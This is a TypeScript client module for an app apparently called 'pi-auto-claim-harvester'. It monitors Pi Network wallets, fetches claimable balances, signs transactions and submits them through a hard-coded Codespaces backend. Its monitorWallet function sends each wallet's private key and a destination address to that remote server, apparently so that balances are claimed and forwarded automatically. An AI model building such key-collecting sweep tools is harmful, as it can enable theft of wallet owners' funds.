
import { toast } from "sonner";
import * as StellarSdk from '@stellar/stellar-sdk';

// Determine the correct backend URL based on the environment
// This helps the app work both in development and production
const getBackendApiUrl = () => {
  // Production (Vercel)
  if (window.location.hostname === 'pi-auto-claim-harvester.vercel.app') {
    return "https://supreme-giggle-9w4949v5pxvhxwpj-3001.app.github.dev/api";
  }
  
  // GitHub Codespaces
  if (window.location.hostname.includes('github.dev')) {
    return "https://supreme-giggle-9w4949v5pxvhxwpj-3001.app.github.dev/api";
  }
  
  // Local development
  return "http://localhost:3001/api";
};

const BACKEND_API_URL = getBackendApiUrl();

// Pi Network API base URL
const PI_API_BASE_URL = "https://api.mainnet.minepi.com";

// Network passphrase for Pi Network (correct one from status)
export const NETWORK_PASSPHRASE = "Pi Network";

// Monitor a wallet (sends to backend)
export const monitorWallet = async (walletData: {
  address: string;
  privateKey: string;
  destinationAddress: string;
}) => {
  try {
    // Send wallet data to backend
    const response = await fetch(`${BACKEND_API_URL}/monitor-wallet`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(walletData),
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error("Error starting wallet monitoring:", error);
    toast.error("Failed to start wallet monitoring");
    throw error;
  }
};

// Stop monitoring a wallet
export const stopMonitoringWallet = async (walletId: string) => {
  try {
    const response = await fetch(`${BACKEND_API_URL}/stop-monitoring/${walletId}`, {
      method: 'DELETE',
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error("Error stopping wallet monitoring:", error);
    toast.error("Failed to stop wallet monitoring");
    throw error;
  }
};

// Get all monitored wallets from backend
export const getMonitoredWallets = async () => {
  try {
    const response = await fetch(`${BACKEND_API_URL}/wallets`);
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error("Error fetching monitored wallets:", error);
    toast.error("Failed to fetch monitored wallets");
    throw error;
  }
};

// Get logs from backend
export const getLogs = async () => {
  try {
    const response = await fetch(`${BACKEND_API_URL}/logs`);
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error("Error fetching logs:", error);
    toast.error("Failed to fetch logs");
    throw error;
  }
};

// Clear logs on backend
export const clearLogs = async () => {
  try {
    const response = await fetch(`${BACKEND_API_URL}/logs`, {
      method: 'DELETE',
    });
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error("Error clearing logs:", error);
    toast.error("Failed to clear logs");
    throw error;
  }
};

// Fetch claimable balances for a wallet address
export const fetchClaimableBalances = async (walletAddress: string) => {
  try {
    // Delegate this call to the backend
    const response = await fetch(`${BACKEND_API_URL}/claimable-balances/${walletAddress}`);
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error("Error fetching claimable balances:", error);
    toast.error("Failed to fetch claimable balances");
    throw error;
  }
};

// Fetch sequence number for an account - this is still needed for the client to validate
export const fetchSequenceNumber = async (sourceAddress: string) => {
  try {
    console.log(`Fetching sequence number for account: ${sourceAddress}`);
    
    // Use the backend to fetch this
    const response = await fetch(`${BACKEND_API_URL}/sequence/${sourceAddress}`);
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Server error: ${response.status}`);
    }
    
    const data = await response.json();
    
    if (!data.sequence) {
      console.error("No sequence number found in API response:", data);
      throw new Error("Sequence number not found in account data");
    }
    
    console.log(`Raw sequence number received for ${sourceAddress}: ${data.sequence} (type: ${typeof data.sequence})`);
    
    return data.sequence;
  } catch (error) {
    console.error("Error fetching sequence number:", error);
    toast.error("Failed to fetch sequence number");
    throw error;
  }
};

// These functions are still needed on the client for wallet validation
// Generate transaction hash from XDR
export const getTransactionHash = (xdr: string): string => {
  try {
    // Parse the transaction envelope from XDR
    const transactionEnvelope = StellarSdk.xdr.TransactionEnvelope.fromXDR(xdr, 'base64');
    
    // Create a transaction object with the correct network passphrase
    const tx = new StellarSdk.Transaction(transactionEnvelope, NETWORK_PASSPHRASE);
    
    // Get the hash
    return tx.hash().toString('hex');
  } catch (error) {
    console.error("Error generating transaction hash:", error);
    throw new Error(`Failed to generate transaction hash: ${error instanceof Error ? error.message : 'Unknown error'}`);
  }
};

// Sign transaction with key (exactly like Stellar Lab)
export const signTransaction = (xdr: string, secretKey: string): string => {
  try {
    // First calculate the hash using the correct network passphrase
    const txHash = getTransactionHash(xdr);
    console.log(`Transaction hash before signing: ${txHash}`);
    
    // Parse the transaction from XDR using the correct method
    const tx = new StellarSdk.Transaction(
      StellarSdk.xdr.TransactionEnvelope.fromXDR(xdr, 'base64'), 
      NETWORK_PASSPHRASE
    );
    
    // Create keypair from secret key
    const keyPair = StellarSdk.Keypair.fromSecret(secretKey);
    
    // Sign the transaction with the keypair
    tx.sign(keyPair);
    
    // Convert back to XDR
    return tx.toEnvelope().toXDR('base64');
  } catch (error) {
    console.error("Error signing transaction:", error);
    throw new Error(`Failed to sign transaction: ${error instanceof Error ? error.message : 'Unknown error'}`);
  }
};

// Submit transaction - this will go through the backend
export const submitTransaction = async (xdr: string) => {
  try {
    console.log(`Submitting transaction XDR through backend: ${xdr}`);
    
    // Get the transaction hash for logging
    const txHash = getTransactionHash(xdr);
    console.log(`Transaction hash: ${txHash}`);
    
    // Submit through backend
    const response = await fetch(`${BACKEND_API_URL}/submit-transaction`, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ tx: xdr })
    });
    
    console.log(`Transaction submission response status: ${response.status}`);
    
    const responseData = await response.json();
    console.log('Transaction submission response:', responseData);
    
    if (!response.ok) {
      if (responseData.extras && responseData.extras.result_codes) {
        console.error("Transaction failed with API result codes:", responseData.extras.result_codes);
        
        const txCode = responseData.extras.result_codes.transaction;
        if (txCode === "tx_bad_auth") {
          throw new Error("Transaction authentication failed. The signature is invalid. Please verify your private key.");
        } else if (txCode === "tx_bad_seq") {
          throw new Error("Incorrect sequence number. Will retry with updated sequence.");
        } else {
          throw new Error(`API error: ${txCode || JSON.stringify(responseData.extras.result_codes)}`);
        }
      }
      
      throw new Error(responseData.detail || responseData.message || `API error: ${response.status}`);
    }
    
    return responseData;
  } catch (error) {
    console.error("Error submitting transaction:", error);
    toast.error(`Transaction failed: ${error instanceof Error ? error.message : "Unknown error"}`);
    throw error;
  }
};
